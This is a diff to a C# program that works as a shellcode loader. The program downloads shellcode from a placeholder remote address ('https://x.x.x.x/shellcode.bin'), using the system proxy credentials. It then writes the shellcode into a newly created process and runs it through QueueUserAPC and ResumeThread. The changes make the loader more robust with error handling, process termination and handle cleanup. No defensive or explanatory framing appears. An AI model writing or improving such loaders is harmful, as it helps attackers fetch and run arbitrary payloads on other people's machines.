@@ -4,6 +4,8 @@ using System.Threading.Tasks;
 using System.IO;
 using System.Threading;
 using System.Net;
+using System.Runtime.ConstrainedExecution;
+using System.Security;
 
 public class Program
 {
@@ -124,6 +126,18 @@ public class Program
         NoCacheModifierflag = 0x200,
         WriteCombineModifierflag = 0x400
     }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
+    [SuppressUnmanagedCodeSecurity]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+
     public Program()
     {
         var si = new STARTUPINFO();
@@ -157,10 +171,11 @@ public class Program
             client.Proxy = WebRequest.GetSystemWebProxy();
             client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
 
+            // Use the tls to download
 
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13; //Use TLS to download shellcode
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
 
-            shellcode = client.DownloadData("https://X.X.X.X/shellcode.bin");
+            shellcode = client.DownloadData("https://x.x.x.x/shellcode.bin");  //IP address the shellcode
         }
 
 
@@ -170,15 +185,23 @@ public class Program
             (uint)shellcode.Length,
             AllocationType.Commit | AllocationType.Reserve,
             MemoryProtection.ReadWrite);
-
+        
+        if (baseAddress == IntPtr.Zero)
+            return;
 
         IntPtr bytesWriten;
-        WriteProcessMemory(
+        success = WriteProcessMemory(
             pi.hProcess,
             baseAddress,
             shellcode,
             shellcode.Length,
             out bytesWriten);
+
+        if (!success)
+        {
+            TerminateProcess(pi.hProcess, 0);
+            return;
+        }
 
 
         MemoryProtection lpflOldProtect;
@@ -190,13 +213,15 @@ public class Program
             out lpflOldProtect);
 
 
-        QueueUserAPC(
-            baseAddress, 
-            pi.hThread,  
+        _ = QueueUserAPC(
+            baseAddress, // shellcode location
+            pi.hThread,  // process
             0);
 
 
-        ResumeThread(pi.hThread);
+        ResumeThread(pi.hThread); 
+        CloseHandle(pi.hThread); //close handles
+        CloseHandle(pi.hProcess);
 
     }
 
